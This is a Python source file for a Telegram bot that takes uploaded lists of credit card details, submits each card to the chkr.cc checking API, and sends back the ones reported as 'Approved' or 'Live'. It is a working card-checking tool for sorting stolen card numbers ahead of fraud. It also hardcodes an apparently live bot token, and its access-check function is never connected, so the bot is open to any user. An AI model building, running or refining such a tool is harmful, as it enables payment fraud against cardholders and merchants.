import os
import requests
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

# ✅ Replace with your own values
BOT_TOKEN = "8122009466:AAFh9h46K-JUhUJfO0NBU6giRXjZPIJ0hMo"  # Get from BotFather
OWNER_ID = 7593550190  # Replace with your Telegram user ID

# ✅ Enable logging for debugging
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

# ✅ Function to check CCs using chkr.cc API
def check_cc(cc_details):
    headers = {
        'authority': 'chkr.cc',
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://chkr.cc',
        'referer': 'https://chkr.cc/',
        'user-agent': 'Mozilla/5.0',
    }

    data = {
        'data': cc_details,
        'key': ''  # Add API key if required
    }

    try:
        response = requests.post('https://chkr.cc/api.php', headers=headers, data=data)
        if response.status_code == 200:
            response_json = response.json()
            return response_json.get('msg', 'Unknown Response')
        else:
            return f"HTTP Error {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"Request Error: {e}"

# ✅ Handle `/start` command
async def start(update: Update, context: CallbackContext):
    user = update.effective_user
    await update.message.reply_text(f"Hello {user.first_name}! Send me a TXT file containing CCs to check.")

# ✅ Handle file uploads (TXT files)
async def handle_file(update: Update, context: CallbackContext):
    file = update.message.document

    # Ensure it's a .txt file
    if not file.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Please send a valid .TXT file!")
        return

    # Download file
    file_path = f"{file.file_name}"
    new_file = await context.bot.get_file(file.file_id)
    await new_file.download_to_drive(file_path)

    # Process file
    with open(file_path, "r") as f:
        ccs = f.readlines()

    approved_ccs = []
    for cc in ccs:
        cc = cc.strip()
        if cc:
            result = check_cc(cc)
            if "Approved" in result or "Live" in result:
                approved_ccs.append(cc)

    # Delete the file after processing
    os.remove(file_path)

    # Send response
    if approved_ccs:
        message = f"✅ Approved CCs:\n" + "\n".join(approved_ccs)
    else:
        message = "❌ No Approved CCs found."

    await update.message.reply_text(message)

# ✅ Restrict access to only OWNER_ID
async def restricted(update: Update, context: CallbackContext):
    if update.message.from_user.id != OWNER_ID:
        await update.message.reply_text("🚫 You are not authorized to use this bot.")
        return False
    return True

# ✅ Handle unknown messages
async def unknown(update: Update, context: CallbackContext):
    await update.message.reply_text("⚠ Unknown command! Send a TXT file to check CCs.")

# ✅ Main function to run the bot
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    # Commands
    application.add_handler(CommandHandler("start", start))
    
    # File handling
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    # Unknown commands
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, unknown))

    # Start bot
    application.run_polling()

if __name__ == "__main__":
    main()
    
